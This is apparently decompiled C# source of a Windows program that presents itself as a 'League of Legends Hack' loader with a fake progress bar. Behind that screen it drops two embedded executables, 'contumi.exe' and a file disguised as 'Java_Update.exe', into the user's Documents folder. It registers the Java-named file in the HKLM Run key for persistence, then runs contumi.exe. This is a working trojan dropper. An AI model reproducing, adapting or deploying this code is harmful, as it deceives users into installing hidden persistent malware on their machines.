using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using hack.My;
using hack.My.Resources;

namespace hack;

[DesignerGenerated]
public class Form2 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private int picloc;

	private int threadloc;

	private int pointloc;

	private string pftgx0000f1;

	private string pjava;

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form2()
	{
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Form)this).add_Shown((EventHandler)Form2_Shown);
		__ENCAddToList(this);
		threadloc = 0;
		pftgx0000f1 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\contumi.exe";
		pjava = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments() + "\\Java_Update.exe";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		PictureBox1 = new PictureBox();
		Timer1 = new Timer(components);
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)PictureBox1).set_BackColor(Color.Black);
		PictureBox1.set_Image((Image)(object)Resources.progressbar);
		PictureBox pictureBox = PictureBox1;
		Point location = new Point(-522, 0);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		Size size = new Size(550, 45);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		Timer1.set_Enabled(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		size = new Size(321, 45);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form2");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("League of Legends Hack Loading");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private int xrnd(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int num = xrnd(0, 10);
		checked
		{
			picloc += num;
			switch (pointloc)
			{
			case 1:
				pointloc = 2;
				((Form)this).set_Text("League of Legends Hack Loading.");
				break;
			case 2:
				pointloc = 3;
				((Form)this).set_Text("League of Legends Hack Loading..");
				break;
			case 3:
				pointloc = 1;
				((Form)this).set_Text("League of Legends Hack Loading...");
				break;
			}
			if (threadloc != 1)
			{
				if (picloc < 300)
				{
					PictureBox pictureBox = PictureBox1;
					Point location = new Point(((Control)PictureBox1).get_Location().X + num, ((Control)PictureBox1).get_Location().Y);
					((Control)pictureBox).set_Location(location);
				}
				else
				{
					((Control)MyProject.Forms.Form1).Show();
					((Form)this).Close();
				}
			}
			else
			{
				Timer1.Stop();
				Point location2 = new Point(((Form)this).get_Location().X, ((Form)this).get_Location().Y - 100);
				((Form)this).set_Location(location2);
			}
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		picloc = 1;
		pointloc = 1;
		((Form)this).set_TopMost(true);
	}

	private void Form2_Shown(object sender, EventArgs e)
	{
		Thread thread = new Thread(formload);
		((Control)this).Focus();
		thread.Start();
	}

	private void moveIt()
	{
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(pftgx0000f1))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(pftgx0000f1);
			Thread.Sleep(1500);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(pftgx0000f1, Resources.contumi, true);
		}
		else
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(pftgx0000f1, Resources.contumi, true);
		}
	}

	private void moveIt2()
	{
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(pjava))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(pjava);
			Thread.Sleep(1500);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(pjava, Resources.Java_Update, true);
		}
		else
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(pjava, Resources.Java_Update, true);
		}
	}

	private void AddCurrentKey(string name, string file)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 84:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001c;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_001c:
					num = 3;
					registryKey.SetValue(name, file);
					break;
					IL_0009:
					num = 2;
					registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					goto IL_001c;
					end_IL_0001_2:
					break;
				}
				num = 4;
				registryKey.Close();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 84;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void formload()
	{
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			moveIt();
			moveIt2();
			Thread.Sleep(1000);
			AddCurrentKey("Java", pjava);
			Thread.Sleep(1000);
			Process.Start(pftgx0000f1);
			Thread.Sleep(200);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			threadloc = 1;
			Interaction.MsgBox((object)"Error. Application is closing...", (MsgBoxStyle)16, (object)null);
			Application.Exit();
			ProjectData.ClearProjectError();
		}
	}
}
